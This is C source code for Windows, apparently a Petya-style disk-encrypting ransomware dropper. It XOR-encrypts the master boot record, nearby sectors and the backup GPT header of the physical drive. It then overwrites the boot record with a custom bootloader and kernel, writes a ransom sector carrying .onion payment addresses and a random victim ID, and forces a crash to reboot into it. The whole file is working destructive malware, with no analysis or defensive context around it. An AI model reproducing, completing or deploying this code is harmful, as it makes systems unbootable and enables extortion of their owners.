#include <Windows.h>
#include "data.h"

typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

signed int hard_reboot()
{
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
    NtCall2(0xc0000350, 0, 0, 0, 6, &uResp); 
    return 0;
}
void XOR()
{
	DWORD write;
	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	char XORMbr[512];
	int sector56 = 56*512;
	SetFilePointer(drive, 0,0, FILE_BEGIN);
	ReadFile(drive, XORMbr, 512, &write, NULL);
	for(int i = 0; i < 512; i++) { XORMbr[i] = XORMbr[i] ^ 0x37; }
	SetFilePointer(drive, sector56,0, FILE_BEGIN);
	WriteFile(drive, XORMbr, 512, &write, NULL);
	SetFilePointer(drive, 512,0, FILE_BEGIN);
	char sectors33[16896];
	ReadFile(drive, sectors33, 16896, &write, NULL);
	for(int i = 0; i < 16896; i++) { sectors33[i] = sectors33[i] ^ 0x37; }
	SetFilePointer(drive, 512,0, FILE_BEGIN);
	WriteFile(drive, sectors33, 16896, &write, NULL);
	CloseHandle(drive);
}
void infect_mbr()
{
	XOR();
	DWORD wb;
	char NewMbr[512];
	char oldMbr[512];
	int sector34 = 34*512;
	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	SetFilePointer(drive, 0,0, FILE_BEGIN);
	ReadFile(drive, oldMbr, 512, &wb, NULL);
	memcpy(NewMbr,bootloader,512);
	memcpy(NewMbr + 440, oldMbr + 440, 0x40);
	SetFilePointer(drive, 0,0, FILE_BEGIN);
	WriteFile(drive, NewMbr, 512, &wb, NULL);
	SetFilePointer(drive, sector34,0, FILE_BEGIN);
	WriteFile(drive, kernel, 8192, &wb, NULL);
	int sector54 = 54*512;
	char bufferdata[512];
	char Base58Alphabet[] = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
	BYTE Id[90];
	char onion1[] = "http://blackhato2zx75ei.onion/";
	char onion2[] = "http://blackhatahtsf7sv.onion/";
	HCRYPTPROV prov;
	CryptAcquireContextA(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT);
	CryptGenRandom(prov, 90, Id);
	CryptReleaseContext(prov, 0);
	for(int i = 0; i < 90; i++) { Id[i] = Base58Alphabet[Id[i] % 58]; }
	memcpy(bufferdata,sector54code,512);
	memcpy(bufferdata + 41, onion1, 30);
	memcpy(bufferdata + 83, onion2, 30);
	memcpy(bufferdata + 169, Id, 90);
	SetFilePointer(drive, sector54,0, FILE_BEGIN);
	WriteFile(drive, bufferdata, 512, &wb, NULL);
	int sector55 = 55*512;
	SetFilePointer(drive, sector55,0, FILE_BEGIN);
	WriteFile(drive, sector55code, 512, &wb, NULL);
	CloseHandle(drive);
}
void encrypt_backup_gpt_header()
{
	DWORD ReturnBytes;
	GET_LENGTH_INFORMATION LengthInformation;

	HANDLE disk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	DeviceIoControl(disk, IOCTL_DISK_GET_LENGTH_INFO, 0, 0, &LengthInformation, sizeof(LengthInformation), &ReturnBytes, NULL); //Get full disk size

	LARGE_INTEGER gpt;
	gpt.QuadPart = LengthInformation.Length.QuadPart -16896;
	char encryptGPTBackup[16896];
	SetFilePointerEx(disk, gpt,NULL, FILE_BEGIN); //Move to the last sector of the drive and go backward 33 sectors
	ReadFile(disk, encryptGPTBackup, 16896, &ReturnBytes, NULL); //Read GPT Header
	for(int i = 0; i < 16896; i++) { encryptGPTBackup[i] = encryptGPTBackup[i] ^ 0x37; } //Encrypt GPT Header Data
	SetFilePointerEx(disk, gpt,NULL, FILE_BEGIN); //Move to the last sector of the drive and go backward 33 sectors
	WriteFile(disk, encryptGPTBackup, 16896, &ReturnBytes, NULL); // overwrite last 33 sectors with a encrypted GPT Header
	CloseHandle(disk); //Close handle to the disk
}
void evil()
{
	DWORD NumberOfBytesReturned;
	HANDLE device = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	PARTITION_INFORMATION_EX info;
	DeviceIoControl(device,IOCTL_DISK_GET_PARTITION_INFO_EX,NULL,0,&info,sizeof(info),&NumberOfBytesReturned,NULL);
	{
		if(info.PartitionStyle == PARTITION_STYLE_MBR)
		{
			infect_mbr();
			hard_reboot();
		}
		else if(info.PartitionStyle == PARTITION_STYLE_GPT)
		{
			infect_mbr();
			encrypt_backup_gpt_header();
		    hard_reboot();
		}
	}
}
void main()
{
	evil();
}